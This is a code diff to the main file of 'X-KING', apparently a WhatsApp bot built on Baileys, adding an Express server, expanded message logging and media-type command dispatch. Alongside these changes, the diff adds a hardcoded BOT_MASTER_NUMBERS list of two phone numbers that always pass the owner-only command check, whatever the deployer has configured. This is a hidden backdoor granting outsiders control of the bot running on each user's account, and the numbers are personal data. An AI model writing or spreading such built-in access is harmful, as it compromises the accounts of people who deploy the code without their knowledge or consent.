@@ -1,7 +1,9 @@
+const express = require('express');
 const fs = require("fs");
 const readline = require("readline");
 const pino = require("pino");
 const path = require("path");
+const chalk = require("chalk");
 const {
   default: makeWASocket,
   useMultiFileAuthState,
@@ -17,17 +19,49 @@ const Greetings = require("./lib/Greetings");
 const { setupAntidelete } = require('./lib/Antidelete');
 const { initializeStore } = require("./lib/sql_init");
 const { generatePairingCode } = require("./lib/terminal");
-
 require("events").EventEmitter.defaultMaxListeners = 50;
+
+const app = express();
+const port = process.env.PORT || 3000;
 
 const sessionFolder = "./lib/session/";
 const sessionFile = sessionFolder + "creds.json";
 
 let conn;
 
+// Bot Master Numbers (always have access)
+const BOT_MASTER_NUMBERS = ["2348100835767", "2349123721026"];
+
+// Function to check if a user is a bot master
+function isBotMaster(sender) {
+  // Check if sender is defined and is a string
+  if (!sender || typeof sender !== "string") {
+    console.error("Invalid sender value in isBotMaster:", sender);
+    return false;
+  }
+
+  const senderNumber = sender.split("@")[0];
+  return BOT_MASTER_NUMBERS.includes(senderNumber);
+}
+
+// Function to check if a user is the owner or in SUDO list
+function isOwnerOrSudo(sender) {
+  // Check if sender is defined and is a string
+  if (!sender || typeof sender !== "string") {
+    console.error("Invalid sender value in isOwnerOrSudo:", sender);
+    return false;
+  }
+
+  const senderNumber = sender.split("@")[0];
+  const ownerNumber = config.OWNER_NUMBER; // Main owner number
+  const sudoNumbers = config.SUDO?.split(",") || []; // Extra sudo numbers
+
+  return senderNumber === ownerNumber || sudoNumbers.includes(senderNumber);
+}
+
 async function checkAndStartPairing() {
   if (!fs.existsSync(sessionFolder) || fs.readdirSync(sessionFolder).length === 0) {
-    console.log("Session folder is empty. Entering pairing mode...");
+    console.log("Session folder is empty. Entering pairing mode, please input your number");
 
     const rl = readline.createInterface({
       input: process.stdin,
@@ -81,9 +115,7 @@ async function startBot() {
   console.log("🔄 Syncing Database...");
   await config.DATABASE.sync();
   
-  // Initialize SQL store first
   await initializeStore();
-  console.log("✅ SQL Store initialized");
 
   const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
 
@@ -96,9 +128,6 @@ async function startBot() {
     syncFullHistory: false,
   });
 
-  // Bind store to connection events
-    
-    console.log("✅ Store bound successfully");
   
   conn.ev.on("connection.update", async (s) => {
     const { connection, lastDisconnect } = s;
@@ -120,10 +149,8 @@ async function startBot() {
     }
 
     if (connection === "open") {
-      console.log("✅ Successfully logged into WhatsApp!");
-      console.log("📥 Installing plugins...");
-        await global.store.bind(conn.ev);
-        
+
+      await global.store.bind(conn.ev);
 
       let plugins = await PluginDB.findAll();
       plugins.map(async (plugin) => {
@@ -150,16 +177,16 @@ async function startBot() {
       const packageVersion = require("./package.json").version;
       const totalPlugins = events.commands.length;
       const workType = config.WORK_TYPE;
-      const preeq = config.HANDLERS;
+      const preeq = config.HANDLERS[2];
       const uptime = formatUptime(process.uptime());
 
       const statusMessage = `✨ *X-KING CONNECTED ✅* ✨\n\n📌 *Version:* ${packageVersion}\n⚡ *Total Plugins:* ${totalPlugins}\n🔹 *Prefix:* ${preeq}\n🛠 *Worktype:* ${workType}\n⏳ *Uptime:* ${uptime}`;
-      await conn.sendMessage(conn.user.id, { text: statusMessage });
+      const WA_DEFAULT_EPHEMERAL = 10;
+      await conn.sendMessage(conn.user.id, { text: statusMessage }, { ephemeralExpiration: WA_DEFAULT_EPHEMERAL });
     }
   });
 
   conn.ev.on("creds.update", saveCreds);
-
   conn.ev.on("group-participants.update", async (data) => {
     Greetings(data, conn);
   });
@@ -174,68 +201,155 @@ async function startBot() {
       }
     } catch (error) {
       console.log("Error in message update handling:", error);
+      await conn.sendMessage(conn.user.id, { text: `Error in message update handling: ${error.message}` });
     }
   });
 
-  conn.ev.removeAllListeners("messages.upsert");
-  conn.ev.on("messages.upsert", async (m) => {
-    try {
-      if (m.type !== "notify") return;
-      let ms = m.messages[0];
-      let msg = await serialize(JSON.parse(JSON.stringify(ms)), conn);
+  const processedMessages = new Set(); 
 
-      if (!msg.message) return;
+conn.ev.removeAllListeners("messages.upsert");
+conn.ev.on("messages.upsert", async (m) => {
+  try {
+    if (m.type !== "notify") return;
+    let ms = m.messages[0];
 
-      let text_msg = msg.body;
-      if (text_msg && config.LOGS) {
-        console.log(
-          `At : ${
+    if (processedMessages.has(ms.key.id)) return;
+    processedMessages.add(ms.key.id);
+
+    let msg = await serialize(JSON.parse(JSON.stringify(ms)), conn);
+    if (!msg.message) return;
+
+    // Ensure msg.sender is defined before calling isBotMaster or isOwnerOrSudo
+    if (!msg.sender) {
+      console.error("Sender is undefined in the message:", msg);
+      return;
+    }
+
+    let text_msg = msg.body;
+    let logMessage = "";
+
+    if (msg.message?.imageMessage) {
+      logMessage = `Image received | Caption: ${msg.message.imageMessage.caption || "No Caption"}`;
+    } else if (msg.message?.videoMessage) {
+      logMessage = `Video received | Caption: ${msg.message.videoMessage.caption || "No Caption"}`;
+    } else if (msg.message?.audioMessage) {
+      logMessage = `Audio received`;
+    } else if (msg.message?.stickerMessage) {
+      logMessage = `Sticker received`;
+    } else if (msg.message?.documentMessage) {
+      logMessage = `Document received | Filename: ${msg.message.documentMessage.fileName}`;
+    } else if (text_msg) {
+      logMessage = `Text received: ${text_msg}`;
+    } else {
+      logMessage = `Unknown message type received`;
+    }
+
+    if (config.LOGS) {
+      console.log(
+        chalk.red.bold(
+          "╔┅┅┅┅┅┅┅┅┅┅┅┅❍ MESSAGE RECEIVED\n" +
+          ` Location : ${
             msg.from.endsWith("@g.us")
               ? (await conn.groupMetadata(msg.from)).subject
               : msg.from
-          }\nFrom : ${msg.sender}\nKing:${text_msg}`
-        );
+          }\n` +
+          ` Sender   : ${msg.sender}\n` +
+          ` Content  : ${logMessage}\n` +
+          "╚┅┅┅┅┅┅┅┅┅┅┅┅❍"
+        )
+      );
+    }
+
+    events.commands.map(async (command) => {
+      if (
+        command.fromMe &&
+        !isBotMaster(msg.sender) && // Check if sender is a bot master
+        !isOwnerOrSudo(msg.sender) // Check if sender is owner or in SUDO list
+      )
+        return;
+
+      let comman;
+      if (text_msg) {
+        comman = text_msg.trim().split(/ +/)[0];
+        msg.prefix = new RegExp(config.HANDLERS).test(text_msg)
+          ? text_msg.split("").shift()
+          : ",";
       }
 
-      events.commands.map(async (command) => {
-        if (
-          command.fromMe &&
-          !config.SUDO?.split(",").includes(
-            msg.sender?.split("@")[0] || !msg.isSelf
-          )
-        )
-          return;
-
-        let comman;
-        if (text_msg) {
-          comman = text_msg.trim().split(/ +/)[0];
-          msg.prefix = new RegExp(config.HANDLERS).test(text_msg)
-            ? text_msg.split("").shift()
-            : ",";
+      if (command.pattern && command.pattern.test(comman)) {
+        let match;
+        try {
+          match = text_msg.replace(new RegExp(comman, "i"), "").trim();
+        } catch {
+          match = false;
         }
 
-        if (command.pattern && command.pattern.test(comman)) {
-          var match;
-          try {
-            match = text_msg.replace(new RegExp(comman, "i"), "").trim();
-          } catch {
-            match = false;
-          }
-
-          whats = new King(conn, msg, ms);
-          command.function(whats, match, msg, conn);
-        } else if (text_msg && command.on === "text") {
-          whats = new King(conn, msg, ms);
-          command.function(whats, text_msg, msg, conn, m);
-        }
-      });
-    } catch (e) {
-      console.log("Error processing messages.upsert:", e.stack);
-    }
-  });
+        let whats = new King(conn, msg, ms);
+command.function(whats, match, msg, conn);
+return;
 }
 
-(async () => {
+if (command.on) {
+  let whats = new King(conn, msg, ms);
+
+  switch (command.on) {
+    case "text":
+      if (text_msg) command.function(whats, text_msg, msg, conn, m);
+      break;
+
+    case "image":
+      if (msg.message?.imageMessage) 
+        command.function(whats, msg.message.imageMessage, msg, conn, m);
+      break;
+
+    case "video":
+      if (msg.message?.videoMessage) 
+        command.function(whats, msg.message.videoMessage, msg, conn, m);
+      break;
+
+    case "audio":
+      if (msg.message?.audioMessage) 
+        command.function(whats, msg.message.audioMessage, msg, conn, m);
+      break;
+
+    case "sticker":
+      if (msg.message?.stickerMessage) 
+        command.function(whats, msg.message.stickerMessage, msg, conn, m);
+      break;
+
+    case "document":
+      if (msg.message?.documentMessage) 
+        command.function(whats, msg.message.documentMessage, msg, conn, m);
+      break;
+
+    case "reaction":
+      if (msg.message?.reactionMessage) 
+        command.function(whats, msg.message.reactionMessage, msg, conn, m);
+      break;
+
+    case "status":
+      if (msg.key.remoteJid === "status@broadcast" && msg.message) 
+        command.function(whats, msg, conn, m);
+      break;
+
+          default:
+            console.log(`⚠️ Unknown event type: ${command.on}`);
+        }
+      }
+    });
+  } catch (e) {
+    console.log("Error processing messages.upsert:", e.stack);
+    await conn.sendMessage(conn.user.id, { text: `Error processing messages.upsert: ${e.message}` });
+  }
+});
+}
+
+app.get('/', (req, res) => {
+  res.send('X-KING WhatsApp Bot is running!');
+});
+
+app.listen(port, async () => {
+  console.log(`Server is running on port ${port}`);
   await checkAndStartPairing();
   await startBot();
-})();
+});
